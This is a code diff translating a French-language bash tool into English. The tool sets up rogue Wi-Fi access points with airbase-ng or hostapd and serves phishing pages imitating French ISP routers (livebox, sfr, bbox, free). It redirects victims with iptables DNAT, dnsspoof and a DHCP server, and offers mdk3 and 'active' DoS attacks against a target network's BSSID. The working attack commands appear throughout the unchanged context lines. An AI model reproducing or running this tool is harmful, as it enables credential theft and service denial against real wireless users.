@@ -16,10 +16,10 @@ echo -e "~~~~~~~~~~~~~~~~~~~|~~<->    /         )     (                         
 echo -e "                   |_________\          ) | (                                  "
 echo -e "                    |    |                |                                    "
 echo -e "___________________(|)__(|)_____________  |  __________________________________"
-echo -e "\e[1;34m Script perso basé sur les rogues AP, hostapd and airbase power.\e[0m"
-echo -e "\e[1;34m A usage personnel seulement.\e[0m"
+echo -e "\e[1;34m Rogue AP script hostapd and airbase power together.\e[0m"
+echo -e "\e[1;34m For a eductional purpose only.\e[0m"
 echo
-echo -e "\e[1;31m Pour une meilleur lecture des choix et des paramètres, je conseille d'afficher la console en grand ecran.\e[0m"
+echo -e "\e[1;31m For a better visibility, put in full screen.\e[0m"
 echo
 }
 ##################################################
@@ -28,10 +28,10 @@ trap f_checkexit SIGINT
 
 f_checkexit(){
 
-        echo -e "\n\e[1;34m[*]\e[0m Désactivation du mode moniteur, suppression des fichiers utilisés pour le crack, backup de votre serveur apache... PATIENTEZ !\n"
+        echo -e "\n\e[1;34m[*]\e[0m Disabling monitor mode, clean temp files, backup of apache... WAIT !\n"
 
        sleep 2;
-        echo -e "\n\e[1;34m[*]\e[0m Remise a zéro de votre interface wifi\n"
+        echo -e "\n\e[1;34m[*]\e[0m Restarting your wireless card as default mode...\n"
         sudo sysctl net.ipv4.ip_forward=0
         sleep 2;
         airmon-ng stop ${moniteurmode} &> /dev/null
@@ -71,24 +71,24 @@ fi
 ##################################################
 
 f_wlan(){
-echo -e "\e[1;34m[*]\e[0m arrét des services pouvant causer conflit..."
+echo -e "\e[1;34m[*]\e[0m Disabling not necessary process... WAIT"
         sleep 2;
 airmon-ng check kill
         sleep 5;
 ifconfig -a
 unset monmode
-while [ -z "${monmode}" ]; do read -p "interface pour l'attaque (ex. wlan0 wlan1 wlp...): " monmode; done
+while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp wlx...): " monmode; done
 if echo ${monmode} | egrep '^wlan*|wlp*|wlx*'  ; then
 	airmon-ng start ${monmode}
         else
-	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez le nom correct de votre interface !\n"
+	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
 	sleep 4;
 f_wlan
 fi
 
 ifconfig -a
 unset moniteurmode
-while [ -z "${moniteurmode}" ]; do read -p "Nom de l'interface en mode moniteur, (ex: wlan0mon, mon0 etc...): " moniteurmode; done
+while [ -z "${moniteurmode}" ]; do read -p "Name of the wireless card in monitor mode:, (ex: wlan0mon, mon0 etc...): " moniteurmode; done
 }
 
 ##################################################
@@ -96,7 +96,7 @@ while [ -z "${moniteurmode}" ]; do read -p "Nom de l'interface en mode moniteur,
 f_floodinterface(){
 ifconfig -a
 unset intmon
-while [ -z "${intmon}" ]; do read -p "Name of your second wireless card (enter wlan5 if you use hostapd multi AP): " intmon; done
+while [ -z "${intmon}" ]; do read -p "Name of your second wireless card, (ex: wlan0mon, mon0 etc...): " intmon; done
        if echo ${intmon} | egrep '^wlan*|wlp*|wlx*'  ; then
 echo -e "\e[1;34m[*]\e[0m Starting monitor mode."
 airmon-ng start ${intmon}
@@ -108,7 +108,7 @@ fi
 
 ifconfig -a
 unset intmoniteur
-while [ -z "${intmoniteur}" ]; do read -p "Entrez le nom de la seconde interface en mode moniteur: " intmoniteur; done
+while [ -z "${intmoniteur}" ]; do read -p "Name of the second wireless card in monitor mode: " intmoniteur; done
 }
 
 ##################################################
@@ -116,9 +116,9 @@ while [ -z "${intmoniteur}" ]; do read -p "Entrez le nom de la seconde interface
 f_config(){
 clear
 f_Banniere
-echo "1.  Editer hostapd.conf pour une configuration personnalisée uniquement"
-echo "2.  Editer dhcpd.conf pour une configuration personnalisée uniquement"
-echo "3.  Menu precedent"
+echo "1.  Edit hostapd.conf for custom configuration only"
+echo "2.  Edit dhcpd.conf for custom configuration only"
+echo "3.  Previous menu"
 echo
 read -p "Choice: " prereqschoice
 
@@ -147,13 +147,13 @@ f_rogueap(){
 clear
 chmod a+x dns.txt
 f_Banniere
-echo "1.  Rogue AP sur résau ouvert avec airbase"
-echo "2.  Rogue AP avec hostapd en WPA avec le wps_pbc d'active"
-echo "3.  Ddos attack"
-echo "4.  Utiliser son fichier perso hostapd.conf (voir dans configuration des fichiers)"
-echo "5.  Menu précédent"
+echo "1.  Rogue AP with airbase"
+echo "2.  Rogue AP with hostapd and the wps push button"
+echo "3.  DoS attack"
+echo "4.  Use your own hostapd conf file (go to file config)"
+echo "5.  Previous menu"
 echo
-read -p "Choix: " fapchoix
+read -p "Choice: " fapchoix
 
 case ${fapchoix} in
 1) f_opnairbaserogue ;;
@@ -171,18 +171,18 @@ f_wlan
 rm -rf /etc/dhcp/dhcpd.conf
 touch /etc/dhcp/dhcpd.conf
 unset essid
-while [ -z "${essid}" ]; do read -p "Rentrez le nom du réseau: METTRE UN ESPACE après la dernière lettre: " essid; done
+while [ -z "${essid}" ]; do read -p "Essid name, LET A SPACE after the last letter: " essid; done
 
 
 
 unset channel
-while [ -z "${channel}" ]; do read -p "Rentrez le canal du réseau: " channel; done
+while [ -z "${channel}" ]; do read -p "Channel (must be different of real AP): " channel; done
 if (($channel >= 1 && $channel <= 13)); then
 
         echo -e "\e[1;34m[*]\e[0m OK"
         sleep 2;
 else
-	echo -e "\n\e[1;31m[-]\e[0m ERREUR: canal invalide, doit etre entre 1 et 13, tout les paramètres doivent etre correct, recommencez tout!\n"
+	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel!\n"
 	sleep 5;
 f_opnairbaserogue
 fi
@@ -190,7 +190,7 @@ fi
 
 
 unset fakepagechoix
-while [ -z "${fakepagechoix}" ]; do read -p "Quel box avez vous cibler pour le phishing? (ex. livebox sfr bbox sfrwifi ou free): " fakepagechoix; done
+while [ -z "${fakepagechoix}" ]; do read -p "Which network you want to phish ? (ex. livebox sfr bbox sfrwifi ou free): " fakepagechoix; done
 if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' || [ "${fakepagechoix}" = 'free' ]; then
 mkdir /root/apachebackup
 cp -R /var/www/* /root/apachebackup/
@@ -199,12 +199,12 @@ cd /var/www/
 rm -rf *
 cp -R /etc/${fakepagechoix}/* /var/www/
 sleep 2;
-        echo -e "\e[1;34m[*]\e[0m OK, lancement de airbase en open"
+        echo -e "\e[1;34m[*]\e[0m OK, Starting airbase-ng"
 xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -P -C 30 -c "${channel}" -e "${essid} " "${moniteurmode}" &> /dev/null &
 sleep 5;
 f_dhcpconf
 else
-	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez livebox ou sfr ou bbox ou free, tout les paramètres doivent etre correct, recommencez tout!\n"
+	echo -e "\n\e[1;31m[-]\e[0m ERROR: enter a correct network to phish !\n"
         sleep 4;
 f_opnairbaserogue
 fi
@@ -233,7 +233,7 @@ allow unknown-clients;
 }
 EOF
 sleep 1;
-echo -e "\e[1;34m[*]\e[0m Lancement et configuration de at0"
+echo -e "\e[1;34m[*]\e[0m Forwarding at0..."
 	ifconfig at0 up
         sudo sysctl net.ipv4.ip_forward=1
         ifconfig at0 10.0.0.1 netmask 255.255.255.0
@@ -248,10 +248,10 @@ echo -e "\e[1;34m[*]\e[0m Lancement et configuration de at0"
         iptables -P FORWARD ACCEPT
         iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
         echo > '/var/lib/dhcp/dhcpd.leases' 
-        echo -e "\e[1;34m[*]\e[0m Lancement du serveur dhcp"
+        echo -e "\e[1;34m[*]\e[0m Starting dhcp server..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null & 
         sleep 3;
-        echo -e "\e[1;34m[*]\e[0m 0m Lancement de la redirection dns et du serveur apache (ATTENTION: le script affecte la racine du dossier /var/www donc si vous comptez utiliser plus tard votre serveur en ligne merci de verifier les droits d'accès aux pages web)."
+        echo -e "\e[1;34m[*]\e[0m Starting dns forwarding..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i at0 -f /tmp/hostbase/hostbasV0.9/dns.txt &> /dev/null &
        sudo chown -R root:www-data /var/www/*
         sleep 1;
@@ -300,10 +300,10 @@ sleep 1;
          iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
          sleep 2;
          echo > '/var/lib/dhcp/dhcpd.leases'
-         echo -e "\e[1;34m[*]\e[0m Lancement du serveur dhcp"
+         echo -e "\e[1;34m[*]\e[0m Starting dhcp server..."
          xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
         sleep 3;
-        echo -e "\e[1;34m[*]\e[0m Lancement de la redirection dns et du serveur apache (ATTENTION: le script affecte la racine du dossier /var/www donc si vous comptez utiliser plus tard votre serveur en ligne merci de verifier les droits d'accès aux pages web)."
+        echo -e "\e[1;34m[*]\e[0m Starting dns forwarding..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i "${monmode}" -f /tmp/hostbase/hostbasV0.9/dns.txt &> /dev/null &
        sudo chown -R root:www-data /var/www/*
        sleep 1;
@@ -325,7 +325,7 @@ touch /etc/dhcp/dhcpd.conf
 touch /tmp/hostapd.conf
 ifconfig -a
 unset monmode
-while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
+while [ -z "${monmode}" ]; do read -p "Wireless card for hostapd rogue AP (ex. wlan0 wlan1 wlp...): " monmode; done
 if echo ${monmode} | egrep '^wlan*|wlp*|wlx*'  ; then 
         ifconfig ${monmode} up
         else
@@ -335,23 +335,23 @@ f_hostapdwps
 fi
 
 unset essid
-while [ -z "${essid}" ]; do read -p "Rentrez le nom du réseau: petite astuce, METTRE UN ESPACE après la dernière lettre: " essid; done
+while [ -z "${essid}" ]; do read -p "Essid name, LET A SPACE after the last letter: " essid; done
 
 
 unset channel
-while [ -z "${channel}" ]; do read -p "Rentrez le canal du réseau: " channel; done
+while [ -z "${channel}" ]; do read -p "Channel (must be different of real AP): " channel; done
 if (($channel >= 1 && $channel <= 13)); then
 
         echo -e "\e[1;34m[*]\e[0m OK"
         sleep 2;
 else
-	echo -e "\n\e[1;31m[-]\e[0m ERREUR: canal invalide, doit etre entre 1 et 13, tout les paramètres doivent etre correct, recommencez tout!\n"
+	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
 	sleep 5;
 f_hostapdwps
 fi
 
 unset fakepagechoix
-while [ -z "${fakepagechoix}" ]; do read -p "Quel box avez vous cibler pour le phishing? (ex. livebox sfr bbox sfrwifi ou free): " fakepagechoix; done
+while [ -z "${fakepagechoix}" ]; do read -p "Which network you want to phish ? (ex. livebox sfr bbox sfrwifi ou free): " fakepagechoix; done
 if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' ] || [ "${fakepagechoix}" = 'free' ]; then
 mkdir /root/apachebackup
 cp -R /var/www/* /root/apachebackup/
@@ -364,7 +364,7 @@ sleep 2;
 sleep 1;
         echo -e "\e[1;34m[*]\e[0m OK"
 else
-	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez soit livebox, sfr, bbox, ou free, tout les paramètres doivent etre correct, recommencez tout!\n"
+	echo -e "\n\e[1;31m[-]\e[0m ERROR: enter a correct network to phish !\n"
         sleep 4;
 f_hostapdwps
 fi
@@ -400,11 +400,11 @@ pbc_in_m1=1
 friendly_name=WPS Access Point
 EOF
        sleep 2;
-       echo -e "\e[1;34m[*]\e[0m Lancement de hostapd en cours, patientez..."
+       echo -e "\e[1;34m[*]\e[0m Starting hostapd... wait..."
 xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /tmp/hostapd.conf &> /dev/null &
 echo $! >/tmp/hostapd.pid
 sleep 5;
-       echo -e "\e[1;34m[*]\e[0m Lancement de hostapd_cli en arrière plan..."
+       echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background..."
 while : ; do
         xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
        echo $! >/tmp/hostapdclirefresh.pid
@@ -417,10 +417,10 @@ f_ddos(){
 clear
 f_Banniere
 chmod a+x activedos.sh
-echo "1.  Ddos mdk3"
+echo "1.  Sample DoS mdk3"
 echo "2.  Active DoS if you use hostapd rogue AP"
 echo "3.  Active DoS if you use airbase rogue AP"
-echo "4.  Menu précédent"
+echo "4.  Previous menu"
 echo
 read -p "Choix: " ddoschoix
 
@@ -437,30 +437,30 @@ esac
 f_interface(){
 f_floodinterface
 unset ESSID
-while [ -z "${ESSID}" ]; do read -p "ESSID du reseau cible: " ESSID; done
+while [ -z "${ESSID}" ]; do read -p "ESSID of target network: " ESSID; done
         echo -e "\e[1;34m[*]\e[0m OK"
 
 
 unset canal
-while [ -z "${canal}" ]; do read -p "Rentrez le canal du réseau cible: " canal; done
+while [ -z "${canal}" ]; do read -p "Channel of target network: " canal; done
 if (($canal >= 1 && $canal <= 13)); then
 
         echo -e "\e[1;34m[*]\e[0m OK"
         sleep 2;
 else
-	echo -e "\n\e[1;31m[-]\e[0m ERREUR: canal invalide, doit etre entre 1 et 13, tout les paramètres doivent etre correct, recommencez tout!\n"
+	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
 	sleep 5;
 f_interface
 fi
 
 
-read -ep "                BSSID du réseau cible : " BSSID           
+read -ep "                BSSID of target network : " BSSID           
 echo "  "
 while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
 do                                                                           
-echo -e " $rojo Erreur : BSSID non conforme $colorbase"
+echo -e " $rojo Error : BSSID no valid $colorbase"
 echo "  "
-read -ep "                BSSID du réseau cible : " BSSID 
+read -ep "                BSSID of target network : " BSSID 
 echo "  "            
 done
 f_floodinstantane
@@ -503,7 +503,7 @@ f_mainmenu
 ##################################################
 
 f_active(){
-echo -e "\e[1;34m[*]\e[0m DoS for airbase selected"
+echo -e "\e[1;34m[*]\e[0m Active DoS for airbase selected"
 sleep 6;
 cd /tmp/hostbase/hostbaseV0.9/
 x-terminal-emulator -e bash activedos.sh
@@ -514,10 +514,10 @@ f_mainmenu
 ##################################################
 
 f_confperso(){
-      echo -e "\e[1;34m[*]\e[0m Vous avez choisi votre configuration personnel"
+      echo -e "\e[1;34m[*]\e[0m You choose your own configuration"
 sleep 2;
 
-echo -e "\e[1;34m[*]\e[0m Hostapd conf perso"
+echo -e "\e[1;34m[*]\e[0m Hostapd custom conf"
 ifconfig -a
 unset monmode
 while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
@@ -530,13 +530,13 @@ f_confperso
 fi
 
 unset passerelle
-while [ -z "${passerelle}" ]; do read -p "Passerelle de votre fake AP: " passerelle;
+while [ -z "${passerelle}" ]; do read -p "Gateway of fake AP: " passerelle;
 if [[ ! ${passerelle} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then ${passerelle}=; fi
 done 
 
 
 unset fakepagechoix
-while [ -z "${fakepagechoix}" ]; do read -p "Quel box avez vous cibler pour le phishing? (ex. livebox sfr bbox ou sfrwifi): " fakepagechoix; done
+while [ -z "${fakepagechoix}" ]; do read -p "Which network you want to phish ? (ex. livebox sfr bbox ou sfrwifi): " fakepagechoix; done
 if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'sfrwifi' ]; then
 mkdir /root/apachebackup
 cp -R /var/www/* /root/apachebackup/
@@ -547,12 +547,12 @@ cp -R /etc/${fakepagechoix}/* /var/www/
 sleep 2;
         echo -e "\e[1;34m[*]\e[0m OK"
 else
-	echo -e "\n\e[1;31m[-]\e[0m ERREUR: rentrez livebox ou sfr ou bbox ou free, tout les paramètres doivent etre correct, recommencez tout!\n"
+	echo -e "\n\e[1;31m[-]\e[0m ERROR: enter a correct network to phish !\n"
         sleep 4;
 f_confperso
 fi
       
-      echo -e "\e[1;34m[*]\e[0m Lancement de hostapd en cours, patientez..."
+      echo -e "\e[1;34m[*]\e[0m Starting hostapd... wait..."
 xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /tmp/hostapd.conf &> /dev/null &
 echo $! >/tmp/hostapd.pid
 sleep 5;
@@ -569,10 +569,10 @@ sleep 5;
         echo > '/var/lib/dhcp/dhcpd.leases'
         echo 
         sudo sysctl net.ipv4.ip_forward=1
-        echo -e "\e[1;34m[*]\e[0m Lancement du serveur dhcp"
+        echo -e "\e[1;34m[*]\e[0m Starting dhcp serveur..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
         sleep 3;
-        echo -e "\e[1;34m[*]\e[0m Lancement de la redirection dns et du serveur apache (ATTENTION: le script affecte la racine du dossier /var/www donc si vous comptez utiliser plus tard votre serveur en ligne merci de verifier les droits d'accès aux pages web)."
+        echo -e "\e[1;34m[*]\e[0m Starting dns forwarding..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i "${monmode}" -f /tmp/hostbase/hostbasV0.9/dns.txt &> /dev/null &
         sudo chown -R root:www-data /var/www/*
         sleep 1;
@@ -595,7 +595,7 @@ while : ; do
 ##################################################
 
 f_scan(){
-        echo -e "\e[1;34m[*]\e[0m OK, analyse des services pouvant causer conflit avec aircrack ou hostapd... PATIENTEZ"
+        echo -e "\e[1;34m[*]\e[0m OK, stopping not necessary process... WAIT"
 if [ -f "/etc/init/network-manager.conf" ];then
         systemctl stop NetworkManager.service
         systemctl disable NetworkManager.service
@@ -622,7 +622,7 @@ f_mainmenu
 ##################################################
 
 f_stop(){
-           echo -e "\e[1;34m[*]\e[0m Arret de vos actions précédentes, patientez..."
+           echo -e "\e[1;34m[*]\e[0m Restarting your wirelesse card as default mode and clean up your files... WAIT"
 sleep 2;
 airmon-ng stop ${moniteurmode} &> /dev/null
 sleep 4;
@@ -642,13 +642,13 @@ ifconfig ${monmode} up
         rm -rf *
         sleep 1;
         killall xterm
-        echo -e "\n\e[1;34m[*]\e[0m Attaque stoppée...\n"
+        echo -e "\n\e[1;34m[*]\e[0m Attack stopped...\n"
         sleep 2;
         f_mainmenu
         else
         kill $(< /tmp/terminal.pid)
         killall xterm
-        echo -e "\n\e[1;34m[*]\e[0m Attaque stoppée...\n"
+        echo -e "\n\e[1;34m[*]\e[0m Attack stopped...\n"
         sleep 2;
 	f_mainmenu
 fi
@@ -659,14 +659,14 @@ fi
 f_mainmenu(){
 clear
 f_Banniere
-echo "1.  Configuration des fichiers"
+echo "1.  File configuration"
 echo "2.  Fake AP attaque"
-echo "3.  Ddos attaque"
-echo "4.  Scan passif (éxécuter en PLEIN écran, meilleur visu)"
-echo "5.  Stoper l'attaque en cours (si il y en a une)"
-echo "6.  Quitter"
+echo "3.  DoS attaque"
+echo "4.  Passif scan (start airodump windows in full screen mode)"
+echo "5.  Stop alive attack (if there one)"
+echo "6.  Quit"
 echo
-read -p "Choix: " menuchoix
+read -p "Choice: " menuchoix
 case ${menuchoix} in
 1) unset clean; f_config ;;
 2) unset clean; f_rogueap ;;
@@ -680,7 +680,7 @@ esac
 
 # run as root
 if [ "$(id -u)" != "0" ]; then
-	echo -e "\e[1;31m[!]\e[0m Desole mais ce script a besoin des droits d'admin" 1>&2
+	echo -e "\e[1;31m[!]\e[0m Sorry but this script need admin session" 1>&2
 	exit 1
 else
 	clean=1
